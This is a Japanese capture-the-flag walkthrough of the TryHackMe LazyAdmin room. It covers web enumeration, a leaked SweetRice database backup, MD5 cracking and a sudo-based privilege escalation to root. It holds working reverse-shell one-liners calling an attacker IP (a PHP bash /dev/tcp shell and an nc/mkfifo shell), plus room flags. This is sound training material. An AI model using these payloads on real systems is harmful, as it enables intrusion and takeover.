# LazyAdmin CTF

https://tryhackme.com/r/room/lazyadmin

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.89.0
root@ip-10-10-31-225:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-03 00:30 GMT
Nmap scan report for 10.10.89.0
Host is up (0.0066s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:34:28:37:AF:E5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.69 seconds
root@ip-10-10-31-225:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-03 00:30 GMT
Nmap scan report for 10.10.89.0
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:34:28:37:AF:E5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.59 seconds
```

### gobuster

```shell
root@ip-10-10-31-225:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.89.0
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 310] [--> http://10.10.89.0/content/]
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

ホームページのコメント
```html
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
```

リンク先を読んだが、Ubuntuであるということしか分からなかった。

```shell
root@ip-10-10-31-225:~# gobuster dir -x php,txt,html -u http://$TARGET/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.89.0/content
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/images               (Status: 301) [Size: 317] [--> http://10.10.89.0/content/images/]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2196]
/license.txt          (Status: 200) [Size: 15410]
/js                   (Status: 301) [Size: 313] [--> http://10.10.89.0/content/js/]
/changelog.txt        (Status: 200) [Size: 18013]
/inc                  (Status: 301) [Size: 314] [--> http://10.10.89.0/content/inc/]
/as                   (Status: 301) [Size: 313] [--> http://10.10.89.0/content/as/]
/_themes              (Status: 301) [Size: 318] [--> http://10.10.89.0/content/_themes/]
/attachment           (Status: 301) [Size: 321] [--> http://10.10.89.0/content/attachment/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
Progress: 882228 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

http://10.10.89.0/content/as/  
→管理者ログイン画面。パスワードリセットあり。

http://10.10.89.0/content/changelog.txt  に書かれているメールアドレス  
- steelcal@gmail.com
- support@basic-cms.org  

は管理者アドレスではなかった。

http://10.10.89.0/content/inc/lastest.txt
```text
1.5.1
```

## 脆弱性

### SweetRice 1.5.1 - Backup Disclosure

```shell
$ searchsploit sweet rice   
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                                                                                                                                                                | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                                                                  | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                                                                      | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                                                                             | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                                                                        | php/webapps/40700.html
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Arbitrary File Uploadは、ユーザー名、パスワードが必要。

```shell
$ cat ./40718.txt 
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip  
```

データベースのバックアップが公開されている脆弱性

http://10.10.12.119/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql	

```php
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
  1 => 'CREATE TABLE `%--%_attachment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `post_id` int(10) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `date` int(10) NOT NULL,
  `downloads` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  2 => 'DROP TABLE IF EXISTS `%--%_category`;',
  3 => 'CREATE TABLE `%--%_category` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `link` varchar(128) NOT NULL,
  `title` text NOT NULL,
  `description` varchar(255) NOT NULL,
  `keyword` varchar(255) NOT NULL,
  `sort_word` text NOT NULL,
  `parent_id` int(10) NOT NULL DEFAULT \'0\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `link` (`link`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  4 => 'DROP TABLE IF EXISTS `%--%_comment`;',
  5 => 'CREATE TABLE `%--%_comment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(60) NOT NULL DEFAULT \'\',
  `email` varchar(255) NOT NULL DEFAULT \'\',
  `website` varchar(255) NOT NULL,
  `info` text NOT NULL,
  `post_id` int(10) NOT NULL DEFAULT \'0\',
  `post_name` varchar(255) NOT NULL,
  `post_cat` varchar(128) NOT NULL,
  `post_slug` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `ip` varchar(39) NOT NULL DEFAULT \'\',
  `reply_date` int(10) NOT NULL DEFAULT \'0\',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  6 => 'DROP TABLE IF EXISTS `%--%_item_data`;',
  7 => 'CREATE TABLE `%--%_item_data` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `data_type` varchar(20) NOT NULL,
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `item_id` (`item_id`),
  KEY `item_type` (`item_type`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  8 => 'DROP TABLE IF EXISTS `%--%_item_plugin`;',
  9 => 'CREATE TABLE `%--%_item_plugin` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  10 => 'DROP TABLE IF EXISTS `%--%_links`;',
  11 => 'CREATE TABLE `%--%_links` (
  `lid` int(10) NOT NULL AUTO_INCREMENT,
  `request` text NOT NULL,
  `url` text NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  12 => 'DROP TABLE IF EXISTS `%--%_options`;',
  13 => 'CREATE TABLE `%--%_options` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content` mediumtext NOT NULL,
  `date` int(10) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
  17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
  18 => 'CREATE TABLE `%--%_posts` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` longtext NOT NULL,
  `keyword` varchar(255) NOT NULL DEFAULT \'\',
  `tags` text NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT \'\',
  `sys_name` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `category` int(10) NOT NULL DEFAULT \'0\',
  `in_blog` tinyint(1) NOT NULL,
  `views` int(10) NOT NULL,
  `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `sys_name` (`sys_name`),
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
);?>
```

```text
admin:manager
passwd:42f749ade7f9e195bf475f37a44cafcb
```
が読み取れる。MD5ハッシュをクラックする。

```shell
D:\tools\hashcat-6.2.6>hashcat -m 0 hash.txt SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt

42f749ade7f9e195bf475f37a44cafcb:Password123
```

下記のログイン情報が判明。

```text
admin:manager
passwd:Password123
```

ダッシュボードにログインできた。

### SweetRice 1.5.1 - Arbitrary File Upload

リバースシェルをアップロード

```shell
$ cat ./shell.php5     
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/1234 0>&1'") ?>

$ python ./40716.py
```

http://10.10.12.119/content/attachment/shell.php5  
にブラウザでアクセス

```shell
$ nc -nlvp 1234 
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.12.119] 39596
bash: cannot set terminal process group (1049): Inappropriate ioctl for device
bash: no job control in this shell

www-data@THM-Chal:/var/www/html/content/attachment$ ls
ls
shell.php5

www-data@THM-Chal:/var/www/html/content/attachment$ ls /home
ls /home
itguy

www-data@THM-Chal:/var/www/html/content/attachment$ ls -al /home/itguy
ls -al /home/itguy
total 148
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
lrwxrwxrwx  1 root  root     9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r--  1 itguy itguy  220 Nov 29  2019 .bash_logout
-rw-r--r--  1 itguy itguy 3771 Nov 29  2019 .bashrc
drwx------ 13 itguy itguy 4096 Nov 29  2019 .cache
drwx------ 14 itguy itguy 4096 Nov 29  2019 .config
drwx------  3 itguy itguy 4096 Nov 29  2019 .dbus
-rw-r--r--  1 itguy itguy   25 Nov 29  2019 .dmrc
drwx------  2 itguy itguy 4096 Nov 29  2019 .gconf
drwx------  3 itguy itguy 4096 Nov 30  2019 .gnupg
drwx------  3 itguy itguy 4096 Nov 29  2019 .local
drwx------  5 itguy itguy 4096 Nov 29  2019 .mozilla
-rw-------  1 itguy itguy  149 Nov 29  2019 .mysql_history
drwxrwxr-x  2 itguy itguy 4096 Nov 29  2019 .nano
-rw-r--r--  1 itguy itguy  655 Nov 29  2019 .profile
-rw-r--r--  1 itguy itguy    0 Nov 29  2019 .sudo_as_admin_successful
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-clipboard.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-display.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-draganddrop.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-seamless.pid
-rw-------  1 itguy itguy   82 Nov 30  2019 .xsession-errors
-rw-------  1 itguy itguy   82 Nov 29  2019 .xsession-errors.old
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
www-data@THM-Chal:/var/www/html/content/attachment$ cat /home/itguy/user.txt

cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

user.txt ゲット。

## 権限昇格

```shell
www-data@THM-Chal:/var/www/html/content/attachment$ cat /home/itguy/mysql_login.txt
<html/content/attachment$ cat /home/itguy/mysql_login.txt                    
rice:randompass
```

```shell
www-data@THM-Chal:/var/www/html/content/attachment$ cat /home/itguy/backup.pl
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```shell
www-data@THM-Chal:/var/www/html/content/attachment$ ls -al /etc/copy.sh
ls -al /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

www-data@THM-Chal:/var/www/html/content/attachment$ cat /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

既にリバースシェルが仕込まれている。
sudoでwww-dataユーザーで実行できる、かつ /etc/copy.sh は誰でも編集できるので、IPとポートを自分のマシンに変更すればrootになれる。

・・・が、/etcに一時ファイルを作れないのが原因で、一筋縄では編集できない。

```shell
www-data@THM-Chal:/tmp$ nano ./copy.sh
nano ./copy.sh
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

Error opening terminal: unknown.

www-data@THM-Chal:/tmp$ sed -i 's/192\.168\.0\.190/10.2.22.182/g; s/5554/8888/g' /etc/copy.sh
< -i 's/192\.168\.0\.190/10.2.22.182/g; s/5554/8888/g' /etc/copy.sh          
sed: couldn't open temporary file /etc/sedZILo4L: Permission denied

www-data@THM-Chal:/tmp$ perl -i -pe 's/192\.168\.0\.190/10.2.22.182/g; s/5554/8888/g' /etc/copy.sh
<l -i -pe 's/192\.168\.0\.190/10.2.22.182/g; s/5554/8888/g' /etc/copy.sh     
Can't remove /etc/copy.sh: Permission denied, skipping file.
```

/tmp にファイルコピー、sedで置換、catで上書きして解決。

```shell
www-data@THM-Chal:/home/itguy$ cd /tmp
cd /tmp

www-data@THM-Chal:/tmp$ cp /etc/copy.sh ./
cp /etc/copy.sh ./

www-data@THM-Chal:/tmp$ sed -i 's/192\.168\.0\.190/10.2.22.182/g; s/5554/8888/g' ./copy.sh   
< -i 's/192\.168\.0\.190/10.2.22.182/g; s/5554/8888/g' ./copy.sh             

www-data@THM-Chal:/tmp$ cat ./copy.sh
cat ./copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.22.182 8888 >/tmp/f

www-data@THM-Chal:/tmp$ cat ./copy.sh > /etc/copy.sh
cat ./copy.sh > /etc/copy.sh

www-data@THM-Chal:/tmp$ cat /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.22.182 8888 >/tmp/f
```

リバースシェル実行

```shell
www-data@THM-Chal:/tmp$ sudo /usr/bin/perl /home/itguy/backup.pl
```

Listen

```shell
$ nc -nlvp 8888 
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.12.119] 34086
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# ls -al /root
total 28
drwxr-x---  4 root root 4096 ian  3 12:34 .
drwxr-xr-x 23 root root 4096 nov 29  2019 ..
lrwxrwxrwx  1 root root    9 nov 29  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
drwx------  2 root root 4096 feb 27  2019 .cache
drwxr-xr-x  2 root root 4096 nov 29  2019 .nano
-rw-r--r--  1 root root  148 aug 17  2015 .profile
-rw-r--r--  1 root root   38 nov 29  2019 root.txt
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

ルートフラグゲット！

## 振り返り
- backup.sql の存在には早くから気づいていたが、認証情報が含まれていることに気づくのに時間がかかった。
- cp, sed, cat で編集する小技は覚えておきたい。
